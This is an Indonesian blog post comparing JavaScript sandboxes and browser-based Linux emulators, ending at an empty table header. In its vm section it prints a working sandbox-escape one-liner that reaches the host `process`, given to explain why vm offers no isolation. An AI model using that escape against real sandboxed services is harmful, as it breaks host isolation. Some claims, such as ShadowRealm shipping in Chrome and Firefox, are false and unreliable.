---
title: Perbandingan Solusi JavaScript untuk Simulasi Kernel Linux
description: Analisis mendalam tentang rekonstruksi lingkungan Linux dalam
  JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEqV85OoYmfrw0bJGMeZ44/qSkuMaKT2Qp6ofWK2lXdfL+Qf8MPA/6N02mca3/rfiVHBNWXZRRFRInbMY/w8FqtA=="
author_sig: "MEQCIBhj6jBofjvfO3Nbr7OWhYI6lrx99BcpNMXNVhLYML0IAiB1q1dHbsDPZuhinQSnV1v0UiS+I8gbymhXTK/90TuidQ=="
---

# Setiap JavaScript sandbox, emulator, simulator, dan honeypot Linux -- dibandingkan

Baik, jadi sudah cukup lama saya terlalu jauh masuk ke lubang kelinci ini lol. Semua dimulai karena saya membantu di [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- sebuah proyek Fortune (saya akan bahas nanti) -- dan saya terus ditanya "tunggu, apa bedanya dengan `v86`?" atau "kenapa tidak pakai `vm2`?" -- dan saya sadar bahwa saya tidak bisa memberikan jawaban yang jelas tanpa memetakan seluruh ekosistem terlebih dahulu. Jadi beginilah hasilnya, saya kira xD

Ternyata ada empat keluarga yang berbeda -- JS sandbox, emulator Linux, simulator Linux, dan honeypot -- dan mereka hampir tidak pernah tumpang tindih, meskipun selalu disebutkan dalam kalimat yang sama. Seseorang yang membangun sistem plugin menggunakan `isolated-vm`. Seseorang yang membuat demo alat CLI menggunakan `v86`. Seseorang yang melakukan intelijen ancaman SSH menggunakan Cowrie. Mereka memecahkan masalah yang sama sekali berbeda di bawah payung "menjalankan kode dalam kotak" yang samar-samar.

Saya menghabiskan banyak waktu membaca kode sumber, laporan CVE, dokumen arsitektur, dan halaman npm untuk menulis artikel ini. Ini akan panjang -- ambil kopi, sungguh. Atau dua.

> Disclaimer kecil: `typescript-virtual-container` ditonjolkan dalam artikel ini karena itulah yang memicu riset ini. Saya sudah berusaha bersikap adil terhadap yang lainnya, tapi ingatlah konteks ini.

---

## Bagian 0 -- Pertama, masalah apa yang sebenarnya kamu selesaikan?

Sebelum melompat, ada baiknya kita tepat tentang kegunaan setiap keluarga, karena terminologi cepat menjadi kacau dan orang-orang terus mencampuradukkan semuanya (saya juga, sebelum saya duduk dan memetakan semuanya dengan rapi).

**JS sandbox** mengisolasi kode JavaScript dari proses Node.js host. Model ancamannya adalah: kode JS tidak terpercaya yang mungkin memanggil `process.exit()`, membaca file, atau meluncurkan proses anak. Solusinya adalah batasan di sekitar eksekusi V8. Alat-alat ini tidak memiliki konsep shell Linux, sistem file dengan izin, atau SSH.

**Emulator Linux** menjalankan kernel Linux asli yang tidak dimodifikasi di dalam emulator CPU (x86, RISC-V, OR1K) yang diimplementasikan dalam JavaScript atau WebAssembly. Kamu menjalankan OS sungguhan. Kamu mendapat syscall sungguhan. Kamu mendapat kompatibilitas biner dengan program yang dikompilasi untuk x86. Biaya sumber daya sangat besar.

**Simulator Linux** meniru *perilaku* sistem Linux tanpa menjalankan kernel sungguhan. Mereka mengimplementasikan interpreter shell, sistem file virtual, dan semantik Unix yang cukup untuk mengelabui program dan manusia. Tanpa kernel. Tanpa Wasm. Tanpa emulasi CPU. Jauh lebih sedikit sumber daya.

**Honeypot** dirancang untuk menarik penyerang dan merekam apa yang mereka lakukan. Mereka bukan terutama lingkungan eksekusi -- mereka adalah alat observabilitas. Kesetiaan terhadap perilaku Linux yang sebenarnya hanya penting sejauh mencegah penyerang mendeteksi jebakan.

Dengan kerangka ini, berikut posisi setiap proyek dalam artikel ini:

```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Emulator Linux :   v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Simulator Linux :  typescript-virtual-container (unik di ruang ini)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal :   xterm.js + node-pty (bukan pengisolasi, tapi terkait)
```

---

## Bagian 1 -- JavaScript Sandbox

### 1.1 `vm` -- modul bawaan Node.js (bukan seperti yang kamu kira)

Jawaban paling awal untuk "menjalankan JS tidak terpercaya" di Node adalah modul bawaan `vm`. Ia sudah ada sejak v0.1, jadi banyak orang menggunakannya pertama kali -- dan terbakar.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Apa yang sebenarnya dilakukan `vm`: ia membuat konteks V8 baru (satu set konstruktor bawaan baru -- `Object`, `Array`, `Function`, dll.) dan mengeksekusi kode di dalamnya, dengan referensi bersama ke apa yang kamu masukkan ke `sandbox`. Mesin V8-mu tidak berubah. Prosesmu tidak berubah. Memori dibagikan.

Alasan mengapa `vm` tidak memberikan keamanan apa pun: rantai prototipe JavaScript adalah DAG yang menghubungkan semuanya ke `Object.prototype`. Jika kamu meletakkan objek dari dunia host ke dalam sandbox, tamu dapat menaiki rantai prototipenya dan mencapai konstruktor host. Dari `Function`, kamu dapat memanggil `Function("return process")()` dan mendapatkan `process` asli. Game over. Langsung.

```js
// Ini berhasil dengan sempurna di vm -- kamu mendapatkan process asli
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Maksud saya, dokumentasi Node.js sendiri mengatakan: "Modul vm bukan mekanisme keamanan. Jangan gunakan untuk menjalankan kode yang tidak terpercaya." Peringatan ini sudah ada sejak lama. Orang-orang terus mengabaikannya. Saya pernah melihat aplikasi produksi menggunakan `vm` sebagai sandbox. Tolong, jangan lakukan itu xD

**Verdik**: mekanisme lingkup, bukan sandbox. Gunakan saat kamu perlu mengisolasi variabel (mesin template, fungsionalitas mirip `eval` di mana kamu mengontrol kode). Jangan pernah untuk input yang tidak terpercaya.

**Memori**: overhead dapat diabaikan -- heap V8 yang sama dengan proses host.  
**Keamanan**: tidak ada melawan penyerang yang termotivasi.

---

### 1.2 `vm2` -- upaya komunitas, dan kematiannya yang sangat panjang

`vm2` adalah jawaban komunitas untuk masalah pelarian `vm`. Ide utamanya: bungkus setiap objek yang melintasi batas sandbox dalam `Proxy` yang mencegat akses properti, memblokir penelusuran prototipe, dan menyaring referensi berbahaya. Ide yang cerdas secara teori! Tidak terlalu dalam praktiknya, seperti yang akan kita lihat.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // throws VMError, process tidak dapat diakses
```

Selama beberapa tahun, ini bekerja cukup baik. Tapi permukaan serangan `Proxy` JavaScript sangat besar. Setiap fitur bahasa JS baru -- generator, iterator asinkron, `Symbol.toPrimitive`, `Error.prepareStackTrace`, slot internal `Promise` -- adalah vektor potensial untuk bypass.

Kronologi CVE-nya... sesuatu. Coba lihat ini:

| Tanggal | CVE | Mekanisme |
|---------|-----|-----------|
| Okt 2022 | CVE-2022-36067 | Pelarian konteks host melalui `Error.prepareStackTrace` |
| Apr 2023 | CVE-2023-29017 | Kebocoran objek host melalui error async yang tidak tertangani |
| Apr 2023 | CVE-2023-29199 | Bypass sanitasi exception melalui `handleException()` |
| Apr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Mei 2023 | CVE-2023-32314 | `Proxy` pada `Error.name` → `Function` → RCE |
| Jun 2023 | CVE-2023-37466 | Fungsi async + stack overflow + `Proxy.getPrototypeOf` |
| Jun 2023 | CVE-2023-37903 | Worker thread + pelarian melalui eval |

Tiga CVE kritis di bulan yang sama (April 2023). TIGA. DALAM SATU BULAN. Setelah CVE-2023-37903, maintainer secara resmi menandai library sebagai usang dengan pesan: *"Library mengandung masalah keamanan kritis dan tidak boleh digunakan dalam produksi."*

Maintainer menghidupkannya kembali pada Oktober 2025 dengan versi 3.10.0, mengklaim telah memperbaiki semua yang diketahui saat itu. Pelarian kritis baru (CVE-2026-22709, CVSS 9.8) diungkapkan pada Januari 2026, diikuti oleh sebelas lainnya pada Mei 2026. Sebelas. Polanya tidak berubah dan sejujurnya saya tidak berpikir akan pernah berubah.

Masalah fundamentalnya bersifat arsitektural -- dan ini adalah pelajaran yang butuh waktu bagi seluruh ekosistem untuk mempelajarinya. Kamu tidak bisa membangun sandbox yang aman menggunakan bahasa yang sama dengan yang kamu isolasi, di atas mesin yang sama, dalam proses yang sama. Permukaan pelariannya adalah seluruh implementasi V8 -- dan V8 memiliki jutaan baris C++ yang terus berubah. Setiap fitur JS baru berpotensi membuka jalur serangan baru.

**Verdik**: Jangan gunakan untuk aplikasi yang sensitif terhadap keamanan. Bahkan pada versi terbaru, bypass baru ditemukan setiap beberapa bulan. Maintainer sendiri sudah mengakuinya secara terbuka.

---

### 1.3 `isolated-vm` -- yang benar-benar berfungsi

`isolated-vm` mengambil pendekatan yang benar: menggunakan primitif isolasi asli V8, yaitu Isolate. Setiap Isolate V8 memiliki heap sendiri, garbage collector sendiri, kumpulan bawaan sendiri, dan nol referensi bersama dengan Isolate lain.

Ini adalah batasan yang sama yang digunakan Chrome antar tab. Ini adalah penghalang keamanan nyata, bukan trik bahasa yang dibangun di atas Proxy.

```js
import ivm from "isolated-vm";

// Setiap isolate adalah heap V8-nya sendiri
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // batas dalam MB
const context = await isolate.createContext();
const jail = context.global;

// Melewatkan data melintasi batas memerlukan serialisasi eksplisit
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Tidak dapat mencapai proses host, heap host, atau modul host
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Kamu dapat menghentikan secara paksa berdasarkan timeout atau batas memori
isolate.dispose(); // membebaskan seluruh heap
```

Tipe `Reference` dan `ExternalCopy` adalah jembatan komunikasi eksplisit. Sebuah `Reference` memberikan isolate handle yang dapat dipanggil ke fungsi host -- isolate dapat memanggilnya tetapi tidak dapat memeriksa closure atau prototypenya. `ExternalCopy` men-serialisasi nilai (clone terstruktur) melintasi batas heap. Model jembatan eksplisit ini tidak praktis, tetapi itulah yang membuat isolasi menjadi nyata.

Kamu dapat menetapkan batasan sumber daya yang ketat: memori (isolate dihentikan jika melampaui batas), timeout waktu dinding, dan timeout CPU. Penghentiannya nyata -- ia mematikan seluruh Isolate V8, bukan hanya timeout JS yang bisa dilewati dengan `while(true)`.

**Keterbatasan**: ini hanya JS. Kamu tidak bisa menjalankan bash di dalamnya. Tidak ada konsep file, izin, jaringan, atau proses. Ini adalah alat yang tepat untuk JS yang dikirimkan pengguna (plugin, formula, hook skrip), dan alat yang salah untuk yang lainnya. Penulis `typescript-virtual-container` menyebutkan bahwa dia mempertimbangkannya di awal sebelum menyadari bahwa "menjalankan perintah shell" dan "mengisolasi JavaScript" adalah masalah yang fundamentally berbeda.

**Memori**: ~3-10 MB per isolate kosong, bertambah seiring penggunaan heap.  
**Keamanan**: kokoh. Batas V8 Isolate adalah primitif isolasi asli.  
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- mesin JS terpisah yang dikompilasi ke Wasm

Pendekatan berbeda: alih-alih mengisolasi di dalam V8, jalankan mesin JavaScript yang sepenuhnya terpisah yang dikompilasi ke WebAssembly. Host berjalan di V8/Node. Tamu berjalan di QuickJS-dalam-Wasm. Sandbox Wasm menyediakan batas isolasi.

QuickJS masih merupakan karya Fabrice Bellard (orang yang sama di balik QEMU, FFmpeg, JSLinux, TinyEMU -- orang ini tidak nyata, sungguh, bagaimana satu orang bisa melakukan semua itu?). Ini adalah mesin JS kecil yang sesuai standar ES2023 yang ditulis dalam C, dan ketika dikompilasi ke Wasm ukurannya hanya sekitar 500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Berjalan di QuickJS, sepenuhnya terpisah dari V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS adalah mesin JavaScript kecil yang sesuai standar ES2023 yang ditulis dalam C. Dikompilasi ke Wasm, ukurannya sekitar 500 KB untuk varian sinkron, ~1 MB untuk varian asinkron (Asyncify). Manajemen memori dilakukan secara manual -- setiap nilai yang kamu ekstrak dari VM harus dibebaskan secara eksplisit, yang agak merepotkan tetapi mencegah kejutan GC lintas batas. Sebuah trade-off yang lucu!

Wrapper `@sebastianwessel/quickjs` menambahkan API yang lebih ergonomis di atasnya, dengan sistem file virtual opsional, dukungan fetch, dan stub modul Node.js:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Model keamanannya berbeda dari `isolated-vm`: model memori linier Wasm membuat tamu tidak dapat mengakses objek heap V8 secara langsung. Permukaan serangannya adalah antarmuka host↔Wasm (import/export), bukan seluruh bahasa JS. Ini umumnya dianggap lebih kuat daripada sandbox berbasis Proxy.

Sisi sebaliknya: QuickJS tidak memiliki tingkat optimasi yang sama dengan V8. Untuk beban kerja CPU-bound di JS, kecepatannya 5 hingga 20 kali lebih lambat dari V8. Untuk potongan kode kecil dan evaluasi yang tidak terpercaya, ini biasanya tidak masalah.

**Memori**: ~500 KB modul Wasm + heap per instance.  
**Keamanan**: batas Wasm, dianggap lebih kuat dari pendekatan berbasis Proxy.  
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- runtime yang mengutamakan izin

Deno mengambil filosofi yang benar-benar berbeda: alih-alih membuat sandbox di dalam Node, bangun runtime baru yang aman secara default. Saya sangat suka pendekatan ini -- seharusnya seperti inilah Node.js dari awal, sejujurnya. Ryan Dahl (pencipta asli Node.js) secara literal menciptakan Deno karena dia menyesali beberapa keputusan desain Node.js, yang cukup gila jika dipikirkan.

Setiap kapabilitas sensitif (baca file, tulis file, jaringan, lingkungan, sub-proses) memerlukan flag `--allow-*` eksplisit:

```bash
# Yang ini hanya bisa membaca dari /data, tidak yang lain
deno run --allow-read=/data script.ts

# Yang ini hanya bisa mengakses satu domain
deno run --allow-net=api.example.com script.ts

# Tidak ada flag = tidak ada izin
deno run untrusted.ts # tidak bisa baca, tulis, jaringan, luncurkan
```

Model izin diimplementasikan di tingkat Rust/OS -- ini bukan trik JS. Ketika kode Deno memanggil `Deno.readFile()`, ia melewati operasi Rust yang memeriksa tabel izin sebelum menyentuh sistem file. Kamu tidak bisa melewatinya dari JS karena syscall tidak pernah terjadi jika izin tidak diberikan.

Untuk menjalankan kode yang benar-benar tidak terpercaya, Deno Workers (Web Workers) menyediakan isolate kedua dalam proses yang sama, masing-masing dengan kumpulan izinnya sendiri. Kamu dapat meluncurkan worker dengan nol izin dan berkomunikasi dengannya melalui `postMessage`.

Deno 2 (dirilis Oktober 2024) menambahkan kompatibilitas npm penuh dan shim kompatibilitas Node.js, yang secara signifikan meningkatkan adopsinya untuk kasus penggunaan sisi server.

**Trade-off**: model keamanan Deno sangat bagus untuk kode yang mungkin kamu percayai sebagian. Untuk kode yang sepenuhnya tidak terpercaya yang mungkin bersifat adversarial, model izin tidak membantu -- kamu memerlukan batas Isolate (`isolated-vm`) atau mesin yang berbeda (`quickjs-emscripten`), karena Deno masih menggunakan V8 dan penyerang yang canggih dapat menemukan bug di tingkat V8.

---

### 1.6 TC39 ShadowRealm -- jawaban yang terstandarisasi (suatu hari nanti)

Badan standarisasi JavaScript (TC39) memiliki proposal bernama ShadowRealm yang mencoba menstandarisasi apa yang coba dilakukan `vm` dan `vm2`, tetapi dengan model keamanan yang benar. Sebuah ShadowRealm menciptakan konteks eksekusi JS yang terisolasi dengan intrinsiknya sendiri, tanpa akses ke realm luar, dan antarmuka import/export yang dikontrol dengan hati-hati.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Intrinsik terpisah, tidak ada akses ke realm luar
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm tersedia di browser (Chrome 90+, Firefox 105+) tetapi belum ada di Node.js stabil pada tahun 2026. Proposal TC39 Compartments dibangun di atasnya untuk isolasi tingkat modul. Ini adalah jawaban terstandarisasi jangka panjang, tetapi belum siap untuk produksi sisi server Node. Ini adalah salah satu hal di mana kamu melihatnya datang dari jauh tapi... belum sampai. Klasik TC39 xD

---

### Ringkasan keluarga sandbox

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Batas isolasi** | tidak ada (lingkup) | Proxy (rusak) | V8 Isolate | Wasm | V8 Isolate + izin Rust |
| **Batas memori** | ❌ | ❌ | ✅ batas ketat | ✅ heap Wasm | sebagian |
| **Timeout CPU** | ❌ | ✅ (bisa dilewati) | ✅ ketat | ✅ | ✅ |
| **Keamanan** | tidak ada | rusak | kokoh | kokoh | kokoh |
| **Kecepatan JS** | V8 asli | V8 asli | V8 asli | ~10x lebih lambat | V8 asli |
| **Browser** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Kompatibilitas Node** | bawaan | ✅ | ✅ | shim sebagian | sebagian |
| **Status** | stabil | berisiko (CVE baru) | ✅ aktif | ✅ aktif | ✅ aktif |
| **Overhead RAM** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |

Verdik: jika keamanan penting bagimu, ada tepat dua opsi nyata -- `isolated-vm` (ekstensi native, V8 Isolate, kecepatan JS penuh) dan `quickjs-emscripten` (Wasm, kompatibel browser, ~10x lebih lambat untuk komputasi intensif). Sisanya adalah "tolong jangan lakukan itu" (`vm`, `vm2`) atau runtime yang memecahkan masalah yang sama sekali berbeda (Deno). ShadowRealm mungkin akan mengubah segalanya suatu hari nanti, tapi belum sekarang.

---

## Bagian 2 -- Emulator Linux dalam JavaScript

Di sinilah hal-hal menjadi sangat menarik bagi saya. Ini adalah *emulator sungguhan* -- mereka mengimplementasikan set instruksi CPU dalam JavaScript atau WebAssembly, memulai image kernel Linux asli, dan menjalankan biner userspace asli. Isolasi berasal dari fakta bahwa tamu dan host tidak berbagi apa pun: ruang memori berbeda, aliran instruksi berbeda.

Harganya sangat mahal, tapi apa yang kamu dapatkan sungguh luar biasa: Linux asli, yang benar-benar berjalan, di browsermu atau proses Node-mu. Semacam cukup gila jika dipikirkan, bukan?

### 2.1 `v86` -- emulator PC x86 dalam JS + JIT Wasm

`v86` oleh Fabrice (copy di GitHub) adalah emulator x86 open-source paling mumpuni dalam JavaScript. Dimulai sebagai interpreter JS murni sekitar tahun 2013 dan berevolusi menjadi sistem JIT di mana blok dasar x86 diterjemahkan ke WebAssembly dengan cepat, meningkatkan kinerja secara signifikan.

Apa yang diemulasikannya:
- **CPU**: x86-32 (IA-32), set instruksi sekitar level Pentium 1. Tidak ada 64-bit (x86-64) -- ini adalah batasan arsitektural perangkat keras, bukan fitur yang hilang.
- **FPU**: melalui `Float64Array` JavaScript. x87 presisi diperluas 80-bit; double JS adalah 64-bit. Ini berarti hasil floating point mungkin sedikit berbeda dari CPU asli.
- **Memori**: dapat dikonfigurasi, dipetakan ke `SharedArrayBuffer` atau `ArrayBuffer` di heap JS.
- **Perangkat keras**: 8254 PIT (timer), 8259 PIC (pengontrol interupsi), kontroler keyboard 8042 (PS/2), CMOS RTC, VGA dengan ekstensi SVGA dan Bochs VBE, kontroler IDE, kontroler floppy (8272A), kartu jaringan NE2000.
- **BIOS**: menggunakan SeaBIOS (BIOS x86 open-source).

JIT bekerja dengan mengidentifikasi blok dasar (urutan instruksi x86 tanpa lompatan), menerjemahkannya ke fungsi WebAssembly, men-cache fungsi tersebut, dan memanggilnya pada eksekusi berikutnya dari blok yang sama. Jalur kode panas mendapatkan kinerja Wasm asli. Jalur dingin jatuh kembali ke interpreter JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Menangkap output serial (konsol kernel Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Mengirim input ke tamu (mengetik di shell)
emulator.serial0_send("ls /\n");
```

**OS yang didukung**: Alpine Linux (sangat baik), Ubuntu 16.04/18.04 (i386 saja), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (dengan catatan), MS-DOS.

**Waktu boot**: 15-40 detik untuk Alpine Linux dari image bersih. Ini melekat pada inisialisasi kernel yang sebenarnya -- kamu tidak bisa melewatinya. Ya, penggunamu akan menonton kernel Linux booting di browser mereka. Itulah dealnya xD

**Memori minimum**: 100-256 MB per instance. Cache kode Wasm JIT saja bisa mencapai puluhan MB untuk instance Linux yang sibuk.

**Penggunaan di Node.js**: didukung penuh. Tidak perlu DOM -- output VGA bisa diabaikan jika kamu hanya tertarik pada output serial.

**Apa yang tidak bisa kamu lakukan**: menjalankan biner 64-bit, menggunakan fitur kernel modern (eBPF, io_uring, dll.), atau menjalankan lebih dari beberapa instance secara bersamaan tanpa mencapai batas memori.

**npm**: [v86](https://www.npmjs.com/package/v86) -- diperbarui terus-menerus, rilis terbaru pada hari yang sama saat saya menulis.  
**GitHub**: [copy/v86](https://github.com/copy/v86)  
**Demo**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux dan TinyEMU -- karya Bellard, dua kali

JSLinux adalah emulator Linux dalam JavaScript milik Fabrice Bellard sendiri -- yang pertama, dirilis pada tahun 2011. Saya terus menyebut Bellard dalam artikel ini karena dia terus muncul: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Orang ini sungguh luar biasa. Benar-benar salah satu kontribusi teknis individu paling mengesankan dalam sejarah perangkat lunak, tanpa berlebihan.

JSLinux asli adalah interpreter x86 JS murni. Pada tahun 2016, Bellard menulis TinyEMU (emulator RISC-V dalam C), mengkompilasinya ke JavaScript melalui Emscripten, dan itu menjadi dasar JSLinux saat ini. Jadi JSLinux saat ini sebenarnya adalah kode C yang menghasilkan JavaScript -- bukan JS yang ditulis tangan sama sekali.

Catatan teknis di situs Bellard layak dibaca: JSLinux saat ini menjalankan CPU RISC-V 32 atau 64-bit (bukan x86), mengemulasi konsol VirtIO, jaringan VirtIO, perangkat blok VirtIO, dan sistem file 9P untuk berbagi file dengan host. Demo JS dikompilasi dari C menggunakan Emscripten -- ini bukan JS yang ditulis tangan.

TinyEMU sendiri mendukung:
- RISC-V RV32IMAFDQC dan RV64IMAFDQC (32 dan 64-bit, dengan floating point, perkalian, instruksi terkompresi)
- x86 melalui KVM (asli saja, tanpa emulasi -- jadi versi JS hanya RISC-V)
- Konsol VirtIO, jaringan, blok, input, sistem file 9P

TinyEMU memiliki demo JavaScript yang disediakan melalui Emscripten. Ini adalah dasar dari JSLinux dan juga digunakan oleh `container2wasm` (lihat bagian 2.5).

**Status JSLinux**: tidak ada paket npm, tidak ada API yang dapat diprogram. Ini adalah demo yang kamu buka di browser. Signifikansi historisnya besar -- ia membuktikan konsepnya. Kegunaan praktis sebagai library: nol.

**TinyEMU**: tidak di npm, sumber C tersedia di [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k -- emulator OR1K

jor1k adalah emulator OpenRISC 1000 (OR1K) yang ditulis dalam JavaScript oleh Sebastian Macke. Ini menarik secara historis karena jor1k memperkenalkan dukungan sistem file VirtIO 9P, yang kemudian diintegrasikan Bellard ke dalam TinyEMU dan JSLinux. Polinasi silang antara proyek-proyek ini sangat erat -- mereka saling meminjam hal satu sama lain, yang sejujurnya adalah salah satu hal paling keren dari pekerjaan emulasi open-source.

**Status**: tidak lagi dirawat secara aktif, tidak ada paket npm. Diarsipkan pada titik ini. Berguna untuk diketahui terutama untuk konteks historis -- jadi jika seseorang menyebut jor1k dalam percakapan, sekarang kamu tahu apa itu :)

---

### 2.4 CheerpX -- emulator x86 komersial untuk browser

CheerpX oleh Leaning Technologies adalah emulator Linux x86 komersial untuk produksi. Ini tidak open-source, tetapi secara signifikan lebih mumpuni daripada v86 untuk menjalankan userspace Debian/Ubuntu asli. Jika kamu membutuhkan VSCode asli di browser, inilah yang kamu perlukan.

Perbedaan utama dengan v86:
- Mendukung ISA yang lebih luas (lebih banyak ekstensi x86, kompatibilitas glibc yang lebih baik)
- Sistem file berbasis IndexedDB di browser (persisten antar reload halaman)
- Dukungan pthread melalui `SharedArrayBuffer` (yang memerlukan header COOP/COEP -- ya header keamanan yang merepotkan itu)
- Dirancang untuk menjalankan VSCode, Python, Node.js, dan aplikasi nyata lainnya -- bukan hanya image OS minimal
- Dukungan profesional dan SLA tersedia (alias kamu bisa memarahi seseorang jika rusak)

Kasus penggunaan tipikal adalah "menjalankan aplikasi Linux asli di browser tanpa server." Perusahaan menggunakannya untuk IDE berbasis browser, tutorial coding, dan dokumentasi interaktif.

```js
// API CheerpX (disederhanakan)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Hubungan dengan Node.js**: CheerpX pertama-tama dirancang untuk browser. Emulator yang mendasarinya secara teoritis bisa berjalan di Node (ini Wasm), tetapi API dan dokumentasi sepenuhnya berorientasi pada penggunaan browser. Penggunaan sisi server tidak didukung.

**Memori**: mirip dengan v86 -- 200+ MB untuk instance Debian asli.  
**Harga**: gratis untuk proyek open-source, lisensi komersial untuk SaaS produksi.  
**Dok**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Node.js di Wasm, bukan emulasi Linux

WebContainers sering disatukan dengan emulator Linux tetapi secara arsitektural berbeda. Mereka tidak mengemulasi x86. Mereka tidak menjalankan Linux. Mereka menjalankan Node.js yang dikompilasi ke WebAssembly menggunakan WASI. Perbedaan ini sangat penting dan saya menghabiskan terlalu banyak waktu bingung tentang ini lol.

Saya pikir kebingungan berasal dari pemasaran -- "menjalankan Node.js di browsermu" terdengar seperti emulasi, tetapi sebenarnya Node.js itu sendiri dikompilasi ke Wasm, bukan emulasi Linux yang menjalankan Node.js di VM. Hal yang sama sekali berbeda.

Arsitekturnya:
1. Node.js dikompilasi ke Wasm (runtime WASI kustom secara spesifik)
2. Service Worker mencegat permintaan jaringan dari server Node.js yang diemulasi dan merutekannya ke tab browser
3. Sistem file hidup di memori browser (tanpa I/O disk)
4. npm adalah implementasi kustom yang dioptimalkan untuk penggunaan browser

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Menulis file
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Menjalankan perintah Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Karena ini menjalankan Node.js asli (dikompilasi ke Wasm), kamu mendapatkan npm asli, API Node.js asli, dan resolusi modul asli. Kamu tidak mendapatkan userspace Linux serba guna -- kamu tidak bisa menginstal paket sistem dengan `apt`, menjalankan biner terkompilasi sembarangan, atau melakukan banyak hal di luar ekosistem Node.js.

**Prasyarat browser**: SharedArrayBuffer (memerlukan header COOP/COEP), dukungan Service Worker, Wasm modern.

**Hubungan dengan Node.js**: dirancang secara eksklusif untuk penggunaan browser. API tidak berfungsi di luar konteks browser.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
**Dok**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- kontainer Docker dikompilasi ke Wasm

`container2wasm` adalah alat (bukan paket npm) dari NTT yang mengambil image kontainer Docker dan mengubahnya menjadi biner WebAssembly yang dapat berjalan di host Wasm mana pun -- termasuk browser. Ketika saya pertama kali melihat ini, saya benar-benar tidak percaya itu berhasil.

Mekanismenya:
- Untuk kontainer x86_64: menyertakan Bochs (emulator x86, dikompilasi ke Wasm) + sistem file root kontainer
- Untuk kontainer riscv64: menyertakan TinyEMU (Bellard lagi!) + sistem file root kontainer
- File `.wasm` yang dihasilkan memulai emulator, me-mount sistem file kontainer, dan mengeksekusi entry point kontainer

```bash
# Mengubah kontainer Ubuntu 22.04 menjadi Wasm
c2w ubuntu:22.04 out.wasm

# Menjalankannya
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Atau menyajikannya untuk penggunaan browser
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

`.wasm` yang dihasilkan besar -- Ubuntu minimal mencapai beberapa ratus MB -- tetapi sepenuhnya mandiri. Kamu bisa mengirim `.wasm` melalui email kepada seseorang dan mereka bisa menjalankan Ubuntu di browser mereka. Kalimat itu seharusnya tidak masuk akal tapi begitulah.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Ringkasan keluarga emulator

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
